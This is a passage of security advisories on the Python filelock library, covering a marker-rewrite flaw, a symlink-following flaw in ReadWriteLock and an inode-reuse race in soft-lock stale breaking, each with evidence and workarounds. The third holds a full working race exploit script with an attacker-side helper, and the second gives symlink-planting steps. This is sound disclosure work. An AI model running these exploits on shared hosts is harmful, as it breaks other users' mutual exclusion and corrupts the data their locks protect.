A contender whose `O_CREAT | O_EXCL` create fails with `EEXIST` goes to `_try_break_stale_lock`. `_read_lock_file` makes sure the path is a regular file (`lstat`, `O_NOFOLLOW` open, `fstat`) and returns its content, mtime and inode (the kernel's identity for a file, independent of its name). It has the `fstat` result in hand but does not look at `st_uid` or `st_mode`. The code parses the content into `pid`, `hostname` and start token and hands them to `owner_is_stale`, whose docstring promises to return `True` "only when this process can prove the exact recorded owner is dead". That proof holds only if the owner wrote the record. A process of another account that can open the marker for writing uses `O_WRONLY | O_TRUNC` (no `O_CREAT`, so `fs.protected_regular` does not block it) and writes `2147483647\n<host>\n`, keeping the host line. The host matches, PID 2147483647 does not exist, and `owner_is_stale` returns `True`.

`break_lock_file` renames the marker to `<lock>.break.<pid>.<token>` and unlinks it. Its mtime and inode guard compares against what the contender read after the rewrite, so it passes. The contender, which runs as the marker's owner, does the rename, so the sticky bit allows it. On the next poll the contender's `O_EXCL` create succeeds. The first holder is not told: `SoftFileLock` has no heartbeat, and on release `_unlink_open_marker` finds another inode or no file at the path and returns without an error.

Other records lead to the same break, each run by the scanner the same way: the holder's own PID and host with a different third line (`owner_is_stale` reads a live PID with another start token as a recycled PID); an empty file (malformed, broken after `MALFORMED_LOCK_AGE_THRESHOLD`, 2 s). `MarkerSoftFileLock` and `SoftFileLease` apply `owner_is_stale` to the `pid=`, `host=` and `start=` fields of a protocol 2 record, and rewriting `pid=` admitted a second process for both. A `SoftFileLease` holder learns of it at its next heartbeat through `on_compromise`; `SoftFileLock` and `MarkerSoftFileLock` holders do not learn of it at all.

The marker becomes writable by another account in two ways. An explicit `mode` with group or other write bits goes through `fchmod`, so the umask does not narrow it (`test_lock_mode_soft` at the scanned commit pins `-rw-rw-rw-` under umask `022`). The default mode passes `0o666` to `os.open`, so under umask `002` the marker is `0o664`. With no `mode` argument, in a setgid and sticky group directory (`3770`), a second member of the group rewrote the marker and a second process of the holder's user acquired the same way. Under umask `000` the marker is `0o666` and any local user can rewrite it. `FileLock(mode=0o666)` on a filesystem where `flock` fails with `ENOSYS` falls back to `SoftFileLock` and produces the same `-rw-rw-rw-` marker (confirmed with `fcntl.flock` replaced by a stub raising `ENOSYS`). With `mode=0o644`, or no `mode` under umask `022`, the other user's open fails with `EACCES` and the second process times out.

    C->>M: O_EXCL fails, read record: holder alive, Timeout
    A->>M: rm: EPERM (sticky directory)
    rect rgb(255, 214, 214)
        A->>M: open O_WRONLY|O_TRUNC, write "2147483647 host"
        C->>M: read record, owner_is_stale: PID 2147483647 is dead
        C->>M: rename to cache.lock.break.*, unlink (the owner may)
        C->>C: next poll: O_EXCL succeeds, enters beside H
        Note over H,C: both inside, no error, H's release finds another inode and returns
    end
```

## Evidence

The scanner's reproducer runs two `victim` workers on `with SoftFileLock(path, mode=0o666, timeout=1):` in a root-owned `1777` directory under `/tmp` (overlayfs, `fs.protected_regular=2`), with `attacker` uid 1001 sharing no group with `victim`. It printed the marker as `-rw-rw-rw- victim '<pid>\n<host>\n<start token>\n'`, the second worker's `Timeout`, `rm: cannot remove ...: Operation not permitted` for `attacker`, the marker after the rewrite as `'2147483647\n<host>\n'`, first worker exit status 0, and the log order `['first entered', 'second entered', 'second left', 'first left']`. The second worker entered and left while the first was still inside its `with` block, about 50 ms after the rewrite, on its second poll. It prints `BUG` every time, in about 6 s. Our review ran the same reproducer: `BUG` on 4.2.0, `OK` on the head of #836. The review also tried umask `000` with the default mode.

## Impact

A local user who can write a soft lock's marker but cannot remove it gets a second process admitted into the critical section while the first holder is still inside. With no `lifetime` set, `SoftFileLock` and `MarkerSoftFileLock` give neither process a signal. Whatever the lock protects (a cache, an install directory, a state file) then has two concurrent writers. The other user chooses the moment and gains nothing else: it touches no file other than the marker. The process that rewrites the record runs under a different UID from the holder; the same-UID contender only follows the protocol.

## Workarounds

Do not give soft markers group or other write bits: pass no `mode` (or `mode=0o644`) under umask `022`. A soft-lock contender of another account waits as well on a `0o644` marker, because contenders only read and rename. The write bits matter only for the native `flock` lock and for `FileLock`'s first open before it falls back to a soft lock. Avoid umask `002` or `000` for processes that take soft locks in directories shared with other accounts, and keep lock files in a directory other users cannot write.

title: filelock: ReadWriteLock follows a symlink at the lock path into SQLite
desc:
### Summary

`ReadWriteLock` and `AsyncReadWriteLock` resolve the lock path with `pathlib.Path.resolve()` and pass it to `sqlite3.connect()` without refusing a symlink. A local user who can create names in the lock's directory, such as `/tmp` or a shared cache, can plant a symlink at the lock path and make the victim's process create, lock, or write the file it points to, or break mutual exclusion between the victim's own processes.

### Details

`ReadWriteLock.__init__` stores `pathlib.Path(lock_file).resolve()`, which follows a final symlink, and every connection opens that path through `sqlite3.connect()` with no `O_NOFOLLOW` or regular-file check. SQLite's own VFS also resolves the final symlink in user space, so `fs.protected_symlinks` and the sticky bit do not help: the kernel never sees a symlink to refuse. The other lock classes do not follow a final symlink: `FileLock` opens with `O_NOFOLLOW`, and `SoftReadWriteLock` coordinates through `<path>.rw/`.

### Proof of concept

On Linux, with the victim and attacker as different users and `/shared` mode 1777 with `fs.protected_symlinks=1`:

1. The attacker runs `ln -s /home/victim/private/pwned.flag /shared/app.rwlock.db`.
2. The victim constructs `ReadWriteLock("/shared/app.rwlock.db")`. A plain `os.open(..., O_NOFOLLOW)` on the same path fails, but the lock creates `/home/victim/private/pwned.flag`, owned by the victim, inside a directory the attacker cannot write.
3. With `/shared/cache.rwlock.db -> /shared/a.db`, one victim process holds the write lock. The attacker repoints the link to `/shared/b.db`, and a second victim process acquires the write lock while the first still holds it.

The same behavior reproduces on macOS, on Windows 11, and through `AsyncReadWriteLock`.

### Impact

A local attacker with write access to the lock directory can make the victim create empty files it owns at paths the attacker cannot write, make the victim hold a SQLite lock on another application's database so that application gets `database is locked`, and give two victim processes the write lock at once, letting them corrupt the resource the lock protects.

### Workarounds

Keep `ReadWriteLock` paths in directories that only trusted users can write.

title: filelock: SoftFileLock stale-lock break removes a live lock file on a reused inode number and admits two holders
desc:
The stale-lock break shared by `SoftFileLock`, `MarkerSoftFileLock` and `SoftFileLease` (and their async variants, and a `FileLock` that has fallen back to a soft lock on `ENOSYS`, the "not implemented" error) recognises the marker it judged stale by two values. The marker is the lock file at `<path>`, whose presence says a process holds the lock. The values are its inode number (the kernel's identity for a file, independent of its name) and its modification time (mtime) not being newer. The check runs after the contender has already closed the marker, so nothing keeps the inode allocated.

On a filesystem that hands a freed inode number straight to the next file (ext4, xfs, overlayfs on them) the next holder's marker can carry that number. A contender still between its read and its break then renames and unlinks the live marker. Another local user (the other user below) who can create files in the lock's directory, a sticky `/tmp` included (the sticky bit is a directory flag that lets only a file's owner remove it), forces this at will. It plants a marker with a stale owner record and a modification time in the future and unlinks it as soon as a contender has read it. Two processes of the user running the lock (the lock user below) then hold the same default-configured lock at once, and nothing raises or logs. Affected versions: filelock >= 3.22.0 and <= 4.2.0 (finding `ANT-2026-KIIS96IX`).

## Severity

**CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N, 4.7 (Medium).**

`AV:L` (local): the other user needs an account on the same host. `AC:H` (high attack complexity): a race, though one the other user starts, lengthens (by making the lock user's `/proc` read slow) and retries at every release. The scanner measured 10 to 26 overlaps per 20-second run. `PR:L` (low privileges): an unprivileged account is enough. `UI:N` (no user interaction): the lock user's processes act on their own. `C:N` (no confidentiality impact): the other user reads nothing. `I:H` (high integrity impact): two holders write the data the lock protects, and neither learns of the other. `A:N` (no availability impact): the lock keeps working.

Classification from the review: security, conditional on a sticky shared directory, ext4-style inode reuse and at least two contenders of the lock user. Our review verified it across UIDs (a UID is a user account's numeric id): the other user as uid 1001, the lock user's processes as uid 1000, BUG on 4.2.0 over ext4. The scanner rated it high (CWE-367).

## Scope and preconditions

- The other user can create files in the lock's directory; a root-owned `1777` directory such as `/tmp` or `/var/tmp` is enough. It creates, `utime`s (sets the timestamps of) and unlinks only its own file. The sticky bit stops it removing the lock user's marker (checked: `EPERM`, operation not permitted), so the lock user's own stale break does the deletion.
- The directory is on a filesystem that hands a freed inode number straight to the next file. ext4 does (six create/unlink rounds returned one number six times, in the image's overlayfs `/tmp` and on a loop-mounted ext4), and xfs does. tmpfs returned six increasing numbers and the same run there gave no overlap, and btrfs does not hand a freed number back.
- The lock user has at least two processes contending for the lock, and the displaced holder is still inside when the next contender polls (the breaker itself comes back one `poll_interval`, 50 ms by default, later).
- The lock is `SoftFileLock`, `MarkerSoftFileLock` or `SoftFileLease` (or async forms). The default `flock`-based `FileLock` joins them only after it has fallen back to `SoftFileLock` on `ENOSYS`. `StrictSoftFileLock` does not call `break_lock_file`, so it is not affected.
- The same overlap also occurs with no other user involved, under heavy same-account contention, when a contender breaks a dead holder's marker and a successor creates its marker within the same timestamp tick (about once in 750 crashes with 64 workers on a 2-CPU machine, not on tmpfs).

filelock's checks against another local user hold only when no other user can replace the lock's directory or any of its ancestors. That is the case when each ancestor belongs to the lock user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.

## Affected code

At the scanned commit b831496, the re-check sits in [`break_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_util.py#L113-L118). Its callers are [`SoftFileLock._try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123), [`MarkerSoftFileLock._try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_marker.py#L74-L81) and [`SoftFileLease._try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_lease.py#L229-L256). The reader [`_read_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L312-L334) closes the judged marker before the verdict.

## Introduced

e35c3afac473 ("feat(soft): detect and break stale locks", #476, 2026-02-13), first released in 3.22.0 (verified against the tags). Every release since, up to 4.2.0, carries the check.

## Mechanism

`_try_break_stale_lock` reads the marker through `_read_lock_file` (`lstat`, `O_RDONLY | O_NONBLOCK | O_NOFOLLOW` open, `fstat`, read, `close`), decides with `owner_is_stale` that the owner is gone, and calls `break_lock_file(lock_file, mtime, ino)`:

```python
# src/filelock/_util.py:113-118
if (current := os.lstat(lock_file)).st_mtime > mtime_before or current.st_ino != ino_before:
    return
break_path: Final[str] = f"{lock_file}.break.{os.getpid()}.{secrets.token_hex(16)}"
Path(lock_file).rename(break_path)
if (st_after := os.lstat(break_path)).st_mtime <= mtime_before and st_after.st_ino == ino_before:
    Path(break_path).unlink()
```

Between the `close` in `_read_lock_file` and the `lstat` on line 113 nothing keeps the inode allocated. An inode number identifies a file only while something holds that inode. The release path already says so ("Our open descriptor keeps the inode allocated, so its number cannot name a successor's marker yet"); the break path does not. That leaves the modification time, which the file's owner sets to any value and which the code compares by order. With two jobs A and B of the lock user and the other user:

1. The other user creates `app.lock` (inode `I`) with the record `<its own pid>\n<host>\n1\n` and sets its time to the year 2100 with `os.utime()`. A live PID with a wrong start token (the value that identifies one incarnation of a PID) is a recycled PID, so every contender judges the owner stale. On its own this marker only makes the lock user's processes wait: they cannot rename another user's file in a sticky directory (`EPERM`, and `acquire(timeout=1)` raises `Timeout`).
2. A polls, reads `(record, mtime=2100, ino=I)`, closes the file and enters `owner_is_stale()`.
3. The other user unlinks its marker. Inode `I` is free.
4. B polls. The path is empty, so `O_EXCL` (create only if absent) succeeds and ext4 gives the new marker inode number `I`. B holds the lock.
5. A reaches line 113 and looks at B's marker: its time (now) is not newer than 2100 and its inode number is `I`. A renames it (it is the lock user's own file, so the sticky bit does not object), line 117 passes for the same reason, and line 118 unlinks the live marker.
6. The path is empty again while B is still inside. The next contender to poll, A included, creates its marker and holds the lock as well.

When B releases, `_unlink_open_marker` finds another file at the path and leaves it alone, so neither side raises or logs anything. This is not the documented rename/link-back window: the code does not take the link-back branch and leaves no `app.lock.break.*` file behind. With a marker dated 2000, line 113 sees a newer time on B's marker and returns.

The other user does not need luck for the timing of step 3. It sees A's `close()` through inotify (a Linux facility that reports file events; here `IN_CLOSE_NOWRITE` on its own file), and it chooses how long A stays in `owner_is_stale()`. To compare the start token, `process_start_token()` reads `/proc/<pid>/stat`, and the kernel walks every thread of that process. Measured as `victim`, `owner_is_stale()` takes a median of 19 µs for a dead PID and 931 µs for a process with 8000 idle threads. Step 4 then needs another contender's 50 ms poll to fall into that millisecond, and the other user retries at every release of the lock.

A forged time is not required, only convenient. File times advance in 4 ms steps, so a successor's marker created in the same step as the stale marker's last write compares equal and passes `>` / `<=` too (8, 16 and 16 overlaps in three 20-second runs with the `os.utime()` call removed, and still 9 with the comparisons changed to `!=` / `==`). Outside a container the window is wider. With a bare hostname `owner_is_stale()` goes on to `_owner_runs_elsewhere()`, which reads `/proc/<pid>/stat` of every process on the machine (7 ms with 500 processes, 45 ms with 3000, against the default 50 ms `poll_interval`). With 3000 idle processes of the other user, both jobs of the lock user were inside at once in 12 and 13 of 30 rounds.

`MarkerSoftFileLock` and `SoftFileLease` read with `_read_lock_file()` and call `break_lock_file()` in the same way, and showed the same overlap when a stall held A 3 s in its `kill(pid, 0)` probe. The malformed-marker self-heal in `SoftFileLock` hands `break_lock_file()` values from the same closed descriptor. Where the lock user may rename the other user's file (it owns the sticky directory, or is root), the other user only acquires the free lock, dates the marker ahead and exits without releasing. The first contender then breaks that marker as designed and creates its own on the freed number, and a second contender that judged the planted marker before that break removes the live one. Two of the project's own tests at the scanned commit hit the same case without any other user (`test_stale_break_racing_a_successor_admits_no_third_holder`, `test_break_lock_file_leaves_a_swapped_in_symlink_aside`), failing in 10 of 14 runs on ext4.

## Reproduction

The scanner's reproducer for finding `ANT-2026-KIIS96IX`, as received, ran against commit b831496b0273ecd11bf02b8d080ca8b673a538c1. The `repro` script drives the files under `repro.d/`.

**`repro`**

```python
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys

LOCK_DIR = "/tmp/shared-locks"
LOCK_PATH = f"{LOCK_DIR}/app.lock"
VICTIM_JOBS = 6
RUN_SECONDS = 20
JAN_1_2000 = 946684800
JAN_1_2100 = 4102444800


def run_victim_jobs_beside_attacker(stale_marker_mtime):
    # set up: an empty root-owned sticky directory, like /tmp (the sticky bit stops the attacker removing victim files)
    shutil.rmtree(LOCK_DIR, ignore_errors=True)
    os.mkdir(LOCK_DIR)
    os.chmod(LOCK_DIR, 0o1777)

    # run: nobody is paused or traced; the attacker and the victim's jobs just run side by side
    attacker = subprocess.Popen(
        [sys.executable, "/tmp/repro.d/plant_stale_markers.py", LOCK_PATH, str(stale_marker_mtime)],
        stdout=subprocess.PIPE,
        text=True,
        user="attacker",
        group="attacker",
        extra_groups=[],
    )
    try:
        assert attacker.stdout.readline() == "ready\n"
        jobs = [
            subprocess.Popen(
                [sys.executable, "/tmp/repro.d/victim_job.py", LOCK_PATH, str(RUN_SECONDS)],
                stdout=subprocess.PIPE,
                text=True,
                user="victim",
                group="victim",
                extra_groups=[],
            )
            for _ in range(VICTIM_JOBS)
        ]
        holds = []
        for number, job in enumerate(jobs):
            output, _ = job.communicate(timeout=RUN_SECONDS + 60)
            assert job.returncode == 0  # no Timeout or other exception reached the victim's code
            for line in output.splitlines():
                entered, left, is_locked = line.split()
                assert is_locked == "True"  # the job believed it held the lock
                holds.append((float(entered), float(left), f"job{number}"))
    finally:
        attacker.kill()
        attacker.wait()
    break_files = [name for name in os.listdir(LOCK_DIR) if ".break." in name]
    return sorted(holds), break_files


def overlapping_holds(holds):
    # time.monotonic() is CLOCK_MONOTONIC, one clock for every process on the host, so the intervals compare directly
    return [
        (first, second)
        for index, first in enumerate(holds)
        for second in holds[index + 1 :]
        if second[0] < first[1]  # sorted by entry: the second entered before the first had left
    ]


control_holds, _ = run_victim_jobs_beside_attacker(JAN_1_2000)
control_overlaps = overlapping_holds(control_holds)
print(f"CONTROL  attacker's stale markers dated 2000: {len(control_holds)} holds by {VICTIM_JOBS} victim jobs")
print(f"  two jobs inside the lock at once: {len(control_overlaps)} times")

attack_holds, break_files = run_victim_jobs_beside_attacker(JAN_1_2100)
attack_overlaps = overlapping_holds(attack_holds)
print(f"OBSERVED attacker's stale markers dated 2100: {len(attack_holds)} holds by {VICTIM_JOBS} victim jobs")
print(f"  two jobs inside the lock at once: {len(attack_overlaps)} times")
for (entered, left, job), (other_entered, other_left, other_job) in attack_overlaps[:3]:
    print(f"    {job} inside {entered:.3f}-{left:.3f}, {other_job} inside {other_entered:.3f}-{other_left:.3f}")
# the documented rename/link-back window of a stale break would strand a live marker as app.lock.break.*
print(f"  stale-break files left in {LOCK_DIR}: {break_files}")

# check: an exclusive lock with default options must never have two holders at once
print("BUG" if not control_overlaps and attack_overlaps else "OK")
```

**`repro.d/plant_stale_markers.py`**

```python
#!/usr/bin/env python3
import ctypes
import os
import sys
import threading
import time

from filelock import SoftFileLock

lock_path, marker_mtime = sys.argv[1], int(sys.argv[2])
IN_CLOSE_NOWRITE = 0x10
libc = ctypes.CDLL(None)

# contenders only judge markers written on their own host, so take the host string from a marker of our own
with SoftFileLock(lock_path):
    with open(lock_path) as own_marker:
        host = own_marker.read().splitlines()[1]

# <pid>\n<host>\n<start token>\n: this PID is alive but its start token is not 1, so it reads as a recycled PID
# and every contender judges the marker stale
stale_marker = f"{os.getpid()}\n{host}\n1\n".encode()

# To compare start tokens a contender reads /proc/<pid>/stat, and the kernel walks every thread of that process:
# with 8000 threads that is about 1 ms between the contender reading the marker and breaking it.
threading.stack_size(64 * 1024)
for _ in range(8000):
    threading.Thread(target=threading.Event().wait, daemon=True).start()
print("ready", flush=True)

while True:
    # plant the stale marker whenever the lock path is free
    try:
        fd = os.open(lock_path, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o644)
    except FileExistsError:
        time.sleep(0.0002)
        continue
    os.write(fd, stale_marker)
    os.utime(fd, (marker_mtime, marker_mtime))  # a file's owner may give it any modification time
    os.close(fd)

    # once a contender has read it, unlink it: its inode number is free again for the next holder's marker
    inotify = libc.inotify_init()
    libc.inotify_add_watch(inotify, lock_path.encode(), IN_CLOSE_NOWRITE)
    os.read(inotify, 4096)
    os.unlink(lock_path)
    os.close(inotify)

    # creating anything before the next holder does would take that inode number away from it
    while not os.path.lexists(lock_path):
        time.sleep(0.0002)
```

## Attack sequence

```mermaid
sequenceDiagram
    participant X as other local user (uid 1001)
    participant P as app.lock (root-owned 1777 dir, ext4)
    participant A as process A of the lock user (uid 1000)
    participant B as process B of the lock user (uid 1000)
    X->>P: create "livepid host 1", utime to 2100 (inode I)
    A->>P: open, fstat (ino I, mtime 2100), read, close
    A->>A: owner_is_stale: recycled PID (slow: /proc read of X's 8000-thread process)
    rect rgb(255, 214, 214)
        X->>P: inotify IN_CLOSE_NOWRITE on own file: unlink it, I is free
        B->>P: O_CREAT|O_EXCL: new marker gets inode I, B holds and enters
        A->>P: lstat: mtime now <= 2100 and ino == I: rename to app.lock.break.*
        A->>P: lstat break name: same, unlink B's live marker
        A->>P: next poll 50 ms later: O_EXCL create, A enters beside B
        Note over A,B: B's release finds another inode, leaves it, no error on either side
    end
```

## Evidence

The scanner's reproducer runs six `victim` jobs (uid 1000) looping `with SoftFileLock("/tmp/shared-locks/app.lock"):` around 50 to 150 ms of work, printing `time.monotonic()` entry and exit and `lock.is_locked`, for 20 s. Beside them runs an `attacker` process (uid 1001) with 8000 idle threads that plants its marker whenever the path is free, waits for `IN_CLOSE_NOWRITE`, unlinks it and waits for the next `victim` marker. The control (markers dated 2000) prints `191 holds by 6 victim jobs, two jobs inside the lock at once: 0 times`. The disturbed run (dated 2100) prints `196 holds, two jobs inside the lock at once: 15 times`, for example `job3 inside 130.436-130.530, job5 inside 130.444-130.521`, with `stale-break files left in /tmp/shared-locks: []`. Six runs gave between 11 and 24 overlaps, 0 in each control, every `with` block ending without error with `is_locked == True`.

An `strace` of a landed round shows A's `close(4</tmp/app.lock>(deleted))`, B's `openat(O_WRONLY|O_CREAT|O_EXCL|...)` with `st_ino=296421`, and A's `lstat`, `rename`, `lstat`, `unlink` all on 296421, followed by B's `write(4</tmp/app.lock.break.32232.7d9f...>(deleted), ...)` and A's own create 53 ms later.

Our review ran the reproducer over a loop-mounted ext4 `/tmp` inside the container (the host's btrfs does not reuse a number). Result: BUG on 4.2.0 in 43 s, with the other user as uid 1001 against the lock user's processes as uid 1000; it created and unlinked only its own file in a root-owned `1777` directory. On btrfs the same run is OK, so the condition is the filesystem's inode allocation. On the head of #843 the run was OK with 0 overlaps in 193 holds.

## Impact

A local user who can create files in the lock's directory puts two processes of another user inside the same default-configured `SoftFileLock`, `MarkerSoftFileLock` or `SoftFileLease` at once, with no exception, no `lifetime`, no lease expiry and no `break_lock()` involved. Two holders then write the data the lock protects. `SoftFileLock` and `MarkerSoftFileLock` holders learn nothing. A displaced `SoftFileLease` holder got `compromise.reason == "owner-changed"` at its first heartbeat (the periodic refresh a lease holder runs) when the second holder's marker was still at the path, and `None` after 13 s when the second holder had already released.

It is a race, but the other user controls the start and the length of the window, and each failed attempt costs the lock user's processes one poll. Under the same interference with two processes of the lock user and 20 ms critical sections, 26 of 110 holds in 60 s found their own marker unlinked (`st_nlink == 0`, no name left for the file) while inside, without two holds overlapping. Not affected: tmpfs and btrfs, a lock with a single contender, `StrictSoftFileLock`.

## Workarounds

Keep soft locks in a directory other users cannot create files in (a `0700` directory of the lock's user) rather than a shared sticky directory, or place the lock directory on tmpfs, which does not reuse inode numbers. Where the native `FileLock` works (local ext4 with `flock`), prefer it over `SoftFileLock`. `StrictSoftFileLock` is not affected.
